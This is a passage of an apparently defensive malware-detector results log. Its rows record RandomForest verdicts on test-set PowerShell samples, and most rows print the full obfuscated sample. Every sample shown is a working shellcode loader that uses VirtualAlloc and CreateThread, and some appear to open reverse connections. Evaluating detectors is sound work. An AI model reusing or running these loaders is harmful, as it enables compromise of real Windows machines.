sta','f','xbd,0xa6,0','7,0x94,0x2e,0x9',',0x','[DllImport(7','0xbd,0xe1,0x6','a,0x92,0x6b,0x98,0x04,',',0x77,0xb4,0xa2,0x01,0x87,0x62,0xc8,0xad','b,0xda,0x36','1d,0xcf,0xd0,0x33,0xdd,0xb0,0x59,0xd6,0xec,0xf0,0x3e,0x92,0x5e,0xc1,0x35,0xf6,0x52,0xaa,0x18,0xe3,0xe1,0xde,0xb4,0x04,0x42,0x54,0xe3,0x2b,0x53,0xc5,0xd7,0x2a,0xd7,0x14,0x04,0x8d,0xe6,0xd6,0x59,0xcc,0x2f,0x0a,0x93,0x9c,0xf8,0x40','[DllImport(7i1kernel32.dll7i1)]public static extern ','xf2,0x6c,0x0c,0xae,0x9','tPtr memse','4W0g = 4W0z.Length};4W0CJB=4W0w::VirtualAlloc(0,0x1000,4W0g,0x40);for (4W0i=0;4W0i -le (4W0z.Length-1','IntPtr CreateThread(IntPtr lpThreadA','tect);',',0x9f,0xd7,0x13,0x91,0x70,0x5e,0x67,0xb6,0x54,0x3b,0x33,0xd7,0xcd,0xe1,0x92,0xe8,0x0e,0x4a,0x4a,0x4d,0x44,0x66,0x9f,0xfc,0x07,0xee,0x6c,0xcd,0xb7,0xee,0xfa,0x','0xf4,0x7f,0x0b,0x21,0x7e,0x8c,0xeb,0xef,0x77,0xf9,0xff,0x87','7,0xc8,0x','xcc,0x15,0x6b,0xe9,0x47,0x9f,0xf9,0x52,0x3f,0xe0,0xed,0x52,0xbf,0xb6,0x67,0x53,0xd7,0x6e,0xdc,0x00,0xc2,0x70,0xc9,0x34,0x5f,0xe5,0','eep 60};',',0xc4,0xd4,0x26,0x27,0x22,0x86,0x86,0x67,0xfb,0x66,0x7','ab,0x0e,0x9d,0xc','tic extern IntPtr VirtualAl','i1k',',0x1d,','loc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flPro','5f,0xde,0x40,0xab,0xa0,0x4d,0xad,0x04,0','x0c,0xf3,0x63,0x86,0x04,0xeb,0x60,0xa3,0xdf,0x80,0x52,0x','0x6c,0x5e,0x18,0x78,0xbb,0xa6,0x6e,0x90,0x7f;4W0g = 0x1000;if (4W0z.Length -gt 0x1000){','xa9,0xf2,0xb8,0x30,','a,0x03,0xd1,0x31,0xfd,0xd7,0xa8,0xed,0x88,0xc3,0x0a,0x65,0x2a,0x28,0xab,0xaa,0xad,0xbb,0xa7,0x07,0xb9,0xe4,0xab,0x96,0x6e','4W0w2K = pmh','d9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x6b,0x14,0x03,0x6b,0xf5,0x89,0x2f,0xca,0x','0);for (;;){Start-sl','46,0xcb,0xdc,0xa5,0xfc,0x43,0x6c,0x2d,0xdb,0x94,0x93,0x04,0x','x53,0x8f,0xe9,0xa2,0x8c,0x','Ptr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(7i1msvcrt.dll7i1)]public static extern In',',0x06,0x31,0x8d,0x1d,0x9b,0xba,0xdd,0xb0,0x9b,0x5f,0x95,0xb3,0x8a,0xf1','0x92,0','t(IntPtr dest, uint src, uint count);pmh;4W0w = Add-Type -memberDefinition 4W0w2K -Name 7i1Win327i1 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]4W0z = 0xda,0xc6,'))  -REPLACE ([ChAr]55+[ChAr]105+[ChAr]49),[ChAr]34-REPLACE'pmh',[ChAr]39 -cREpLaCe  '4W0',[ChAr]36) )",malicious,TP
2026-07-13 17:01:50,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2545.ps1,custom-ps-ml,UNKNOWN,9c7ea62b-142e-4298-bbce-8ef550469d48,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3296,1605.89," .( $ENv:COMSPEc[4,26,25]-JOiN'')( ((\""{40}{21}{50}{38}{39}{45}{34}{32}{6}{16}{35}{46}{29}{49}{51}{47}{14}{37}{24}{53}{42}{17}{44}{48}{18}{26}{8}{20}{25}{9}{10}{3}{30}{5}{23}{41}{43}{15}{54}{22}{7}{11}{36}{2}{28}{52}{4}{27}{19}{1}{31}{13}{12}{33}{0}\""-f'ex 1Go&amp; powershell tV4BRy tV4e1Go;}','ateThread','x99,0x','f7,0x32,0xbd,0','for (tV4i=0;tV4i -le ','a7,0x38,0x6a,0x64,0xb5,0xd1,0x69,0x97,0xb9,0x14,0xe7,0x71,0x','rDefinition tV4gL8 -Name 1GoWin321Go -namespace Win32','0xef,0xf0,0x09,0xea,0xbc,0x64,0xb','x8e,0x75,0x4f,0x8c,0x55,0x17,0xd6,0x68,0x3b,0x28,0x08,0xd3,0xe4',',0x51,0x86,0xc1,0x57,0xfe',',0x3c,0x4e,0xdb,0x77,0x9b,0x89,0x1c,0xa2,0x5b,0x05,0xe3,0x4d,0x9c,0x0f,0x27,0x19,0xcc,0x27,0x8e,0x22,0x87,0xb7,0x2f,0x','2,0x','enc 1Go;if([IntPtr','oding]::Unicode.GetBytes(tV4qre));tV4BRy = 1Go-','x','0xa5,0x52,0x','Functions -passthru;[Byte[]];[Byte',',0x1f,0x8d,0xe9,0xf1,0x9e,0x47,0x20,0xf9','x32,0x3f,0xae,0x','jumj.ToInt32()+tV4i), tV4z[tV4i], 1)};tV4w::Cre',',0x8c,0x42,0xf9,','ztV4gL8 =','x25,0xa2,0x36,0xa7,0x25,0xca,0xee,0x93,0x75,','e9,0x06,0xa7,0x2d,0x49,0xf7,0x07,0x9e,0x21,0x1d,0x88,0xc1,0x51,0x1e,0x42,0x6a,0xfb,0xf1,0x3b,0xc2,0x93,0x68,0x66,0x98,0x02,0x74,0xbc,0xe4,0x04,0xfe,0x33,0x18,0xca,0xf7,0x3e,0x0a,0xba,0xf7,0x74,0x70,0x6c','xbf,0xcb,0x87,0x5f,0x70,0x1e,0xc9,0x98,0x6d,0xd3,0','0xf1,0xbc,0x08,0x95,0x36,0x8d,0xb2,0x65','84,0x4e,0xb4,0x51,0x4b,0xc7,0','(tV4z.Length-1);tV4i++) {tV4w::memset([IntPtr](tV4','bb,0x98,0xb9,0x4c,0x85,0xee,0xd3,0x4c;tV4g = 0x1000;if (tV4z.Length -gt 0x1000){tV4g = tV4z.Length};tV4jumj=tV4w::VirtualAl',',','x','(0,0,tV4jumj,0,0,0);for (;;){Start-sleep 60};oaz;tV4e = [System.Convert]::ToBase64String([System.Text.Enc','unt);oazoaz;tV4w = Add-Type -membe',']::Size -eq 8){tV426V = tV4env:SystemRoot + 1Go4YDsyswow644YDWindowsPowerShell4YDv1.04YDpowershell1Go;iex 1Go&amp; tV426V tV4BRy tV4e1Go}else{;i','ThreadId);[DllImport(1Gomsvcrt.dll1Go)]public static extern IntPtr memset(IntPtr dest, uint src, uint co','[]]tV4z = 0xd9,0xcb,','5b,0x11,0x2e,0xda,0x61,0x4c,0x18,0x45,0','4c,0xf0,0x6f,0xcd,0x84,0x76,0x8f,0x2e,0x54,0x17,0x19,0xcb,0x65,0x17,0x7d,0x9f,0xd5,0xa7,0xf5,0xcd,0xd9,0x4c,0x5b,0xe6,0x6a,0x20,0x74,0x09,0xdb,0x8f,0xa2,0x24,0xdc,0xbc,0x97,0x27,0x5e,0','tPtr CreateThread(','IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr l','tV4qre = oa',',0x07,0xa3,0x1f,0x90,0x9d,0x48,0xb6,0xc7,0x09,0x53,','a,0xa7,0x44,0x59,0xdb,0x54,0x1c,0x58,0xca,0xca,0x17,0x03,0xcc,0xed,0xf4,0x3f,0x45,0xf6,0x19,0x05','0xef,0x2f,0x96,0xac,0xda,0x24,0x1f,0x39,',',0x0d,0xa6,0x8d,0x08,0x4f,0xee,0x29,0xf3,0x3a,0x06,0x4a,0x8e,0x3c,0xdd,0x31,0x54,0xc8,0xc6,0x91,0x1f,0x6a,0x23,0x20,0xf3,0xed,0xa0,0','p','0xd9,0x74,0x24,0xf4,0xba,0x58,0x12,0x9a,0x31',',0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x14,0x03,0x56,0','x2e,0xb8,0x7a,0xee,0','0x5',' oazoaz[DllImport(1Gokernel32.dll1Go)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(1Gokernel32.dll1Go)]public static extern In','e,0x31,0xc9','loc(0,0x1000,tV4g,0x40);','x9b,0x71,0xf9,0x46,0x0c,0xf6,0xb7,0x5','60,0xad,0')).REPlaCE('tV4','$').REPlaCE('1Go',[STRing][cHAR]34).REPlaCE(([cHAR]52+[cHAR]89+[cHAR]68),'\\').REPlaCE(([cHAR]111+[cHAR]97+[cHAR]122),[STRing][cHAR]39) )",malicious,TP
2026-07-13 17:02:01,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2568.ps1,custom-ps-ml,UNKNOWN,428c45e8-2f68-4905-a33c-9352f892131e,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3410,1675.29,"invoke-EXPreSsion (((\""{20}{80}{10}{66}{67}{70}{37}{31}{77}{29}{73}{51}{4}{56}{21}{30}{45}{28}{76}{71}{57}{54}{68}{75}{1}{36}{14}{55}{63}{69}{53}{74}{46}{7}{15}{65}{3}{5}{13}{19}{58}{59}{12}{42}{78}{16}{34}{52}{33}{43}{39}{72}{11}{62}{44}{60}{79}{25}{47}{61}{22}{6}{2}{23}{50}{49}{64}{48}{8}{24}{40}{41}{27}{32}{26}{35}{38}{0}{17}{9}{81}{18}\"" -f ' -le (X0Tz.Length-1);','x8c,0xb4','2c,0x03,0xae,0x61,0xac,0x50,0xf8,0x09,0xbe,0xc0,0x8d,0x28,0x41,0x39,0x08,0x6c,0xca,0x0f,0x99,0x6a,0x','0xc2,0x27,0xfa,0xaf,0x7b,0xa1,0x94,0x46,0xd7,0x59,0x25,0xee,0xf1,0x9e,0x4a,0xc5,0xcc,0x7b,0xe','es, uint dwStackSize, IntPtr lpStar','7,0xb5,0x7d,0x2f,0x','5b,0x92,0x35,0x0f,0x76,0x87,0xe5,0xa3,0xf0,0x40,0x5e,0x','x31,0x39,0x01,0x69,0x9f,0xec,0x3e,0x69,0x40,0x5','0x10,','0Ti++) {','loc(IntPtr lpAddress, uint dwSize',',0xed,0x74,0x0f,0xcd,','0x1a,0xd0,0xf8,0x7b','5b,0x52,0x','6,0xa9,0x0','0,0x9a,0xe1,0x6d,0x85','9,0x3e,0x76,0xb4,0x1c,0','X','mset([IntPtr](X0Tx.ToInt32()+X0Ti), X0Tz[X0Ti], 1)};X0Tw::CreateThread(0,0,X0Tx,0,0,0);for (;;){Start-sleep 60};','bb,','X0Tc = PsN[DllImport(M1skernel32.dllM1s)]public st',' dest, uint src, uint count);PsN;X0Tw = Add-Type -memberDefinition X0Tc -Nam','0xc0,0x','32,0x53,0x18,0xb4,','0x1e,0x1c,0x16,0x62,0x4e,0','0x99,0xf5,0x87,0x0b,0x21,0xfa,0x5d,0xae,0x15,0x71,0x54,0xfe,0xe0,0xa0,0x00,0xf0,0xbe,0xf0,0x87,0x0f,0x15,0x9e,0x67,0x98,','x1000){X0Tg = X0Tz.Length','ength ','x2a,0xeb,0xea,0x74,0x3e,0x5c,0xdb,0xff,0x12,0x51,0x90,0xad,0x86,0xe2,0xd4,0','ateThr','e M1sWin32M1s -namespace Win32Functions -passthru;[Byte[]];[Byte[]]X0Tz = 0xba,0x92,0xd2,0xf1,0x47,0xda,0xd0,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x56,0x31,0x53,0x15,0x83,',' static e','-gt 0','a9,0','x3f,0x5d,0x42,0x66,0x93,0x35,0x55,0x55,0xf4,0x41,0x06','};X0Tx=X0Tw::VirtualAlloc(0',',0x96,0x6','t(M1skernel32.dllM1s)]public',',0x1000,X0Tg,0x40);for (X0Ti=0;X0Ti',',0x74,0x87,0xe7,0x81,0x80,0x77,0x60,0xd6,0xa7,0x87,0x7','x59,0x54,0x8','2;X0Tg = 0x1000;if (X0Tz.L',',0xce,0x4c,0x44,0x7a,0xf0,0x8c,0x52,0xf1,0xf0,0x8c,0xa2,0x25,0xb5,0xff,0x9b,0x01,0x0','x6c,0x8b',',0xc7,0x64,0x54,0x55,0x91,0x79,0x8d,0','0xc3,0x04,0x03,0x53,0x11,0xe2,0x67,0x2e,0x19,0xc5,0x87,0xcf,0xda,0xaa,0x0e,0','a0,0x11,0x47,0xbe,0x0d,0x56,0x0f,0xa3,0x90,0xbb,0x3b,0xdf,0x19,0x3a,0xec,0x69,0x59,0x18,0x28,0','0x96,0x4e,0x68,0x58,0xff,0x6e',',0xf6,0xde,0xd7,0xc5,0x27,','x41,0','0','r lpThreadAttribut',',0xca,0xa7,0x1e,0xfa,0xba,0x2f,0x4b,0x','df,0x27,0x00,0x63,0x47,0x8c,0xb0,0','xf8,0x4e,0x54,0xad,','f,0x2c,0x5c,0x45,0x8e,0xe4,0xac,0xa6,0x3c,0xc9,0x00,0x55,0x3d,0x0d,0xa6,0x86,','tAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(M1smsvcrt.dllM1s)]public static extern IntPtr memset(IntPtr','e6,0x38,0','0x99,0x22,0x','05,0x44,0xf0,0x86,','x',',0x68,0x18,0xff,0x3d,0x00,','0xed,0x22','0x48,0','xb6,0x7a,0xf6,0xf5,0xd0,0x0f,0x07',',0x97,0xab,0xf9,0x37,',', uint flAllocationType, uint flProtect',');','0x8d,0x1b,0x64,0x46,0xdd,0x8a,0xec,0xbb','x67,0xd4,0x3b,0x4a,0xbc,0xa6,0xe7,0x','[DllImpor','0x87,0x54,0xcf,0xa3,0x86,0xd6,0x12,0xf7,0x68,0xe6,0xdc,0x0a,0x68,0x2f,0x00,0x','0,0x5f,0x27','ead(IntPt','x',',0x96,0xad,0xdd,0x6d,0xac,0xf7,0xfd,0x8c,0x61,0','x79,0xa8,0x43,0x52,0x5f,','xtern IntPtr Cre','1,0xff,0x8b,0x1','3a,0xcd,0xd6,0x7d,0xeb,','atic extern IntPtr VirtualAl','X0Tw::me')).repLacE('X0T',[stRinG][cHar]36).repLacE('PsN',[stRinG][cHar]39).repLacE(([cHar]77+[cHar]49+[cHar]115),[stRinG][cHar]34))",malicious,TP
2026-07-13 17:02:06,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2577.ps1,custom-ps-ml,UNKNOWN,bec7cdc2-4e51-48e0-848b-3bd74c07c891,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2928,1682.14," ((\""{37}{14}{30}{49}{54}{26}{66}{68}{10}{24}{59}{32}{39}{63}{65}{50}{61}{13}{6}{64}{57}{2}{18}{9}{35}{43}{47}{60}{46}{40}{56}{16}{3}{41}{12}{58}{55}{8}{33}{25}{52}{4}{45}{7}{67}{17}{0}{23}{31}{42}{15}{48}{53}{27}{11}{38}{62}{36}{22}{20}{21}{34}{5}{28}{29}{51}{19}{44}{1}\""-f'56,0x57,0x','0,OGtx,0,0,0);for (;;){Start-sleep 60};','0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,','0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0','x50,',' -le (OGtz','x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26','0,0x40,0x50,0x4','1,0x00,0x00,0x29,0xc',',0x42,0x3c,0x8','pStartAddress, IntPtr lpParameter, ui',',0xa2,0x56,0xff,0x',',0x6','0x52,0','tic exter','ff,0xd5,0','24,0x01,','x69,0xbb,0x81,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x','0x10,0x8b',' OG','0xf6,0x75,0xec,0x','c3;OGtg = 0x1000;if (OGtz.Length -gt 0x1000){OGtg = OGtz.Length};OGtx=OGtw::VirtualAlloc(0,0x10','0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,','68,0x99','nt d','0xff,0xd5,0','eateThre','x75,0xec,0x68,0xf0,0xb5','.Length-1);OGti++)',' {OGtw::mem','n IntPtr VirtualAlloc(IntPt',',0xa5,0','t(V3Smsvcrt.dllV3S)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);hAp;OGtw = Add-Type -memberDefinition OGtc -','4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,','00,OGtg,0x40);for (OGti=0;OGti','b,0x4c,0x10,0x78,0xe3,','3,0x53,0x6a,0x00,0x56,','OGtc = hAp[DllImport(V3Skernel32.dllV3S)]public sta','d5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x','Name V3SWin32V3S -namespace Win32Functions -passthru;[Byte[]];[Byte[]]OG',',0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b','x5b','x74,0x61,0x','0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x','tz[OGti], 1)};OGtw::CreateThread(0,','0x50,0x5','38,0xe0','34,0x8b,0x01,','x85','r lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(V3Skernel32.dllV3S)]public static','e5,0x31,0xd2,0x64,0x8b,0x52,0x30,','set([IntPtr](OGtx.ToInt32()+OGti),','x50,0',',0xc0,0x74,0x0c,0xff,0x4e,0x08,0',' extern IntPtr Cr','8,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x0',',0x58,0x',',0x02,0x2c,0x20,0xc1,0xcf,0x0d,','1,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x6','wCreationFlags, IntPtr lpThreadId);[DllImpor','0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x','0x8b,','00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x9','tz = 0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,',',0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c','0x','ad(IntP','0,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0','tr lpThreadAttributes, uint dwStackSize, IntPtr l')).RePLaCe(([cHaR]86+[cHaR]51+[cHaR]83),[sTRing][cHaR]34).RePLaCe('hAp',[sTRing][cHaR]39).RePLaCe(([cHaR]79+[cHaR]71+[cHaR]116),'$') |. ( $eNV:cOMspEC[4,15,25]-join'')",malicious,TP
2026-07-13 17:02:13,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2589.ps1,custom-ps-ml,UNKNOWN,ab9cedc0-1e0d-4b29-bc27-67cf5bca8adb,DESKTOP-BAC9DBQ,malicious,0.9944,RandomForest,3747,1561.5," IeX( (((\""{58}{35}{45}{29}{48}{32}{24}{13}{39}{26}{42}{37}{51}{1}{50}{64}{56}{46}{38}{57}{52}{12}{2}{8}{62}{31}{47}{15}{18}{65}{5}{43}{16}{27}{59}{25}{22}{21}{41}{40}{0}{55}{33}{7}{61}{60}{63}{17}{10}{44}{6}{49}{53}{20}{4}{23}{34}{3}{30}{9}{14}{36}{11}{28}{54}{19}\""-f '/ciD5/Si+WjEaIGj7Pzn7/LZspxhnItZcwfI30S+p19+98XzL4+fGvoZOtH7','P+LP3F','6+sQ67xd10vbLPklkD6R7VRgpFcFMYBIvZMomlgS','cl1ZldUHO248Fgm4xjrz','BL9nddKtAqE6','c8v1C7p7+/mbITInKTbV1nB+M3RJdsU+ofYoKGP53lNaDRpWdEHGb7RcVErQmpJ7QhaVac5qS0gD6iwNXUxg1HrQgaxc5rya1jC6pyU53g8Tld1Nckm5TWBmuRtm5MiIis1JXYAgHm2vGhG6MQjZjuvqysiUEUY1Wkzz0GzapFfAeOxoc4K6uE1mYp2+2VdTXMy','gPac7ts0x34ESDKj0FPk5KnSK0lJZrNQBBSp9Xy41YsM9EE1kybX83BLYOgL9r00x0QXFr/mBib1yWiu+2GvuNPb0buFwOtX5L++E+vCS1j/MA+ZUWiShxUrNYlK2MGOEg/fHdLEv4YWv8S+j+GTPzrNHrUp1b//oRbJI4ZlVnN3x8lv9vk033v24gXbL6lO','yQKaESvEHHw4kdoSr+zqvuxH2N9vg19KF9viwIwX8u4ME88PjdHPBg3RzI2b44c9elFd','gvZNtf2Ev9n63aQ1ZAhDn4C30tszob7N7xrV4l7W3ui1N5X095rbb0k/MhYzFH39UMYyy28ci0Dcfsot/YH82O8mb/uodMdx/Prk7AwDUYz6KD8jNRoirT3cSZ','1f4Ms4YjWFNsmLZbH10Xa1nxJXV1UdOB7mG6TZpvI+W5Lg704SPPzPGkVux3XFxoNXK+Ia++vHAHi9mYooXs+5XQJW/Y0vc+VLB8/cmloQUesFcX1i0I','soGIE1fCUVA598YY+eVpQDCN+Hf58vcpAZ','ompress)),[Te','d0aTOGL/Gr7y8lPEzHTeMN0m5hlvcBMFcRd1KWAbdoak829r8uWEWnqMV56U50S','bPbOStrJniGAqsgfP358Hz8ifjy9yNt0Wi0W2XLWpOd1tcA','fAbyNCkwvsGiqh1UWE82gAH0MFIzYgyQ2/B','6873U2YPMPG6Lkfpj9O/0mU7zwWp','N/N','1Zs4Iftkn1plvkV7TbsKlETzLVv5g84+wtgaD/OSDQooQpeJME/06CYU7XdU2','K/p','oEnd()','9n','FQrif+2Gswt+T79mfTLdbstEh827qg','KJEPTA5eHaeOm2kupj/2s2Cxf2yQ86jH89Hv1i5W53eo1VQsJ','zz05Zr8bZKvX8S/KfvCuuTp48Ol96Z7aNeCrzmynH927u/fp3b2d3fvpp4927qUvv8DwuGnKbclDeVsQ/7DvVRH','vfe6O51OJ/ff/z9cZmQB','qh8di6hpYh6oZOR0fgnZOZhWEcqsiNh','LYt82Y7Tq7poc9NJWq3b1bpN2ypdN3mNnsYJXp0X1P96OW2Lapk2OdBp2vX5OVpmabPKp8V5Qd23WQ2ct7569fxOWixT6v7bb968T','6jfd+PC3OiTCgAJNmBBwWxcW8T','xt.Encoding]','YBxJliUmL23Ke39K9UrX4HShCIBgEyTYkEAQ7M','MLid+w/chFCNwu6IOieYjQ','zu+iOatjKNd6vaSWbqD091TmZ5XVJFZb6fdUd+UvqvbF','qyqBymVWZV1mFkDM7Z28995777333nvv','yeHjcb819bH4347d8NehS2GB9+b4ebs9Taz3a/T','rpRn5XDX/PRJHE2LMb4jT9BuLs+jLPf17h8CSNBOtwR0wHB+ToK8+Thc','O.StreamReader((a IO.Compressio','nUvKF7GuFpsADugoMvUs0uT/AQ==kPa),[IO.Compression.CompressionMode]::Dec','b4Yv6Bxv87ry2Kav6yKZftFtswu8vr7jx7h0','nvxi','n49V8lW6tsqZJizadZE3+6f52vpxWs3yWzqumXWaLPG0qfDvNlunbPF+lyY+nbZ1N36bVeZpn03k6','7PNZvjsbfuvP4Ln/4EfUPav7Y79YWC7bX/E7efO9jbfzx9/GtNxAPfp2vyoxQ1R6+9/s2v+/r73/r9zCwR+lHH6Wk7X4MHPFjbJm3v01+WPqRAfEo','b8w2BTH7sx9PpPCdsQOoV6WTSZTnIxVKelembsy9OX5++se7TNhGtJWenLDGpNGgaaVYSIJpoBzrdXvAkffT4Db18tPV','FeEVmIBnL7Lp+s238ZXL+mbE+l963eT10fp7zapZtd30l+c/Nj3Xl83b','zkr17RcVqY3vFkvionT7JZnt','u+N361NvcfiZF8ev6narHxNy','n.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(kPa7b0H','ed1WFnz/PlRTsnYAbuWD7pIefTanz6jiao3d3ZAZRiuQa+v9t5VjZ50','uiy/rE8Xq/Z6','GIzeaS7B1pRyMp','WFzgbhm3rar5tHdu/f3x7sP7o8PPh3vHnx6VwPr32P+2UdgXh9yGIcn4N8NgEzg/BGmHgrDuPzwFxI2','v1tbr/NfkqT0/G5X+eRV/o','7w+yeuWUJhmbf6TWVnMMnR0kpXlBI','f5estxT54Z/xd8NmWQXuU7ozsEEoeQvStk7JqcgLI3/VmqllVyyb/Pl5qVjGspIFFqEEbtPW/DZA2XZx9OZbPX+XZjNgs/','R5CTfHn5iAa7goT8vhf7nz4Yt+9aeofdMRJTcX5oTngqUvoffi85wE+MUdjfS398lp','::ASCII)).ReadT','jkZPXzx/2qMRf+hoxB0P0qghxw','7','7ydVzMM6OWXr998pA0UDeowzxZ423uDUNd','sal a New-Object;iex(a I','Uk3V4QhyHa+LtUeo5fxt7Pm9B2pUppFwhOIMA1pcAD5S2gsLVn37+XvpvkKXPZ9mkH+JhFev','6Ue/2/Qj+kCdf8LQRhGfpB/9AeTJJj9GU8hhw9bvRqydQ2ni','QnEg4bByeuCTLsnwyMjpeLMBzNEEIi+Ykzr7IqwKfJ3','MfM0hrRwbp6mpZVtmMVN15UeaiibOUlNwobbLLHJqWh+KrwlXW','fTsB7lX97ZNUGiqAYBiK1y/5jZPf2CHHnHJeZmSPz+/8xskv/o','vWedPSN34P37VfEOCTOidoBqk73VfHJ9WyJRK+uV7lBOajbLUq0T/1e/enm2r5kbzwhEbyuq29jt7k79rxKearWF5QP1+9eXYw/jxvn1y3ebMlQ','ftmTdzThpj8mP4SVu8eOr7JqHYdsXZekaEyTG6cfQFU99W18Lfqoj1GY8VXI8IzBbgpD0cIdox')) -replacE ([CHar]107+[CHar]80+[CHar]97),[CHar]39) )",malicious,TP
2026-07-13 17:02:26,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2633.ps1,custom-ps-ml,UNKNOWN,fffe4192-bcbd-46a6-9a63-f97bff3e97cd,DESKTOP-BAC9DBQ,malicious,0.9843,RandomForest,2888,1582.43," ((\""{40}{10}{33}{46}{41}{68}{2}{34}{35}{3}{42}{27}{61}{57}{58}{55}{54}{31}{28}{12}{50}{48}{11}{18}{15}{9}{29}{53}{59}{24}{4}{30}{47}{16}{60}{26}{43}{5}{51}{17}{44}{7}{13}{8}{14}{37}{32}{56}{6}{36}{1}{66}{64}{52}{0}{45}{20}{62}{23}{19}{25}{21}{67}{38}{39}{63}{22}{65}{49}\"" -f '7,0x68,0x02,0xd9,0xc8,0x5f,0xff,0','x85','tr lpStartAddress, IntPtr lp','.dll9IS)]public static extern ','5a,0x','x68,0x29,0x8','8,0x99,0xa5,0x74,0x61,0xff,0xd5,','5,0x97,0x6',',0x05,0x68,0x69,0x69,0x44,0x82,0x68,0x02,0x00','0xf4,0x03,0x','c extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flP','6,0x31,0xff,0x31,0xc0,0xac,0xc1,0','x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8','a',',','1,0xc7,0x38,0xe0,0x75,','0x5a,0x8b,0x12,0xeb,0x','0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x4','xcf,0x0d,0x0','ngth -gt 0x1000){JuSg = JuSz.Leng',',0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,','loc(0,0x1000,JuSg,0','uSw::Cre','0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;JuSg = 0x1000;if (JuSz.Le','0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x','th};JuSx=JuSw::VirtualAl',',0xb8,0x90,0x01,0x0','tr dest, uint src, uint count);YVe;JuSw = A',',0x3c,0x61,0x7c,0x02,0','7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x0','51,0xff,0xe0,0x58,0x',',0x31,0xff,0x31,0xc0,0xac','0x10,0x56,0x','rotect);[DllImport(9ISkernel32.dll9IS)]public static extern IntPtr CreateThread(IntPtr lpThreadAttr','Parameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(9ISm','svcrt','0','0x01,0xbb,0x89,0xe6,0x6a,','x.ToInt32()+JuSi), Ju','Sz[Ju','JuSc = YVe[DllImport(9ISkernel32.dll9IS)]public stati','ui','IntPtr memset(IntP','0,0x00,0x29,0xc4,0x54,0x50,0','0,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd','xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68','ibutes, ','5f,','01,0xd',',0,JuSx,0,0,0);for (;;){Start-sleep 60};','b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x','0,0x6b,','x00,0x6a,0x04,0x56,0x5','1,0xd3,0x8b,0x04,0x8b','0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26',',0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,','57,0x6','S ','-namespace Win32Functions -passthru;[Byte[]];[Byte[]]JuSz = 